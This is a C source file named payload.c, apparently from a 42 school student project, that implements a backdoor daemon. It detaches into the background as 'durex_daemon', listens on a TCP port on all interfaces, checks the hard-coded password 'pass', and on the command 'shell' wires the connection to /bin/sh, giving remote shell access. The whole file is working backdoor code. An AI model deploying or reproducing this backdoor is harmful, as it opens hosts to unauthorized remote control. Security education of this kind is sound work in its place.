/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: eparisot <eparisot@42.student.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/05/25 14:55:42 by eparisot          #+#    #+#             */
/*   Updated: 2021/05/25 14:55:42 by eparisot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../includes/payload.h"

int daemonize(char* name, char* path)
{
	pid_t pid;

	if (!path) 
	{ 
		path="/"; 
	}
    if (!name) 
	{ 
		name="durex_daemon"; 
	}

    // Fork off the parent process
    pid = fork();

    // An error occurred
    if (pid < 0)
        exit(EXIT_FAILURE);

    // Success: Let the parent terminate
    if (pid > 0)
        exit(EXIT_SUCCESS);

    // On success: The child process becomes session leader
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    // Catch, ignore and handle signals
    //TODO: Implement a working signal handler
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    // Success: Let the parent terminate
    if (pid > 0)
        exit(EXIT_SUCCESS);

    // Set new file permissions
    umask(0);

    // Change the working directory to the root directory
    if (chdir("/"))
		exit(EXIT_FAILURE);

	//Close all open file descriptors
    close(0);
	close(1);
	close(2);

	return 0;
}

int r_shell(void)
{
	struct sockaddr_in server_address;
    int server_socket;
	int opt = 1;

	// set the server address
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(REMOTE_PORT);
	// open socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (server_socket < 0)
	{
		printf("error opening socket\n");
		return -1;
	}
	// set socket options
	if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)))
    {
        printf("error setting socket options\n");
		close(server_socket);
        return -1;
    }
	// bind socket to if
    if (bind(server_socket, (const struct sockaddr *)&server_address, sizeof(server_address)))
	{
		printf("error binding socket\n");
		close(server_socket);
        return -1;
	}
	// listen for connexions
	if (listen(server_socket, 3) < 0)
	{
		printf("error listening socket\n");
		close(server_socket);
        return -1;
	}

	struct sockaddr_in client_address;
	socklen_t client_addr_asize;
	int client_socket;
	char buffer[1024] = {0};
	char hello_msg[] = "Welcome !\npassword: ";
	char conn_refused_msg[] = "Connexion refused\n";
	// accept client connexion and ask password
	if ((client_socket = accept(server_socket, (struct sockaddr *)&client_address, &client_addr_asize)) < 0)
    {
        printf("error accepting socket connexion\n");
        close(server_socket);
        return -1;
    }
    send(client_socket , hello_msg , strlen(hello_msg) , 0);
	// check password
	if (read(client_socket , buffer, 1024) < 0)
	{
		printf("error reading socket content\n");
        close(server_socket);
        return -1;
	}
	if (strncmp(buffer, "pass", 4))
	{
		send(client_socket , conn_refused_msg , strlen(conn_refused_msg) , 0);
		close(server_socket);
		close(client_socket);
		return 0;
	}
	// wait for "shell\n" command
	if (read(client_socket , buffer, 1024) < 0)
	{
		printf("error reading socket content\n");
        close(server_socket);
        return -1;
	}
	if (strncmp(buffer, "shell", 5) == 0)
	{
		// Start reverse shell
		dup2(client_socket, 0);
		dup2(client_socket, 1);
		dup2(client_socket, 2);
		char * const argv[] = {"/bin/sh", NULL};
    	execve("/bin/sh", argv, NULL);
		
	}
	close(client_socket);
	close(server_socket);
	if (strncmp(buffer, "stop", 4) == 0)
	{
		return 1;
	}
	return 0;
}

int main(void)
{
	if (daemonize("durex_daemon", "/"))
	{
		printf("Failed to run daemon\n");
		return EXIT_FAILURE;
	}

	while (1)
	{
		if (r_shell() != 0)
			break;
		sleep(1);
	}
	return EXIT_SUCCESS;
}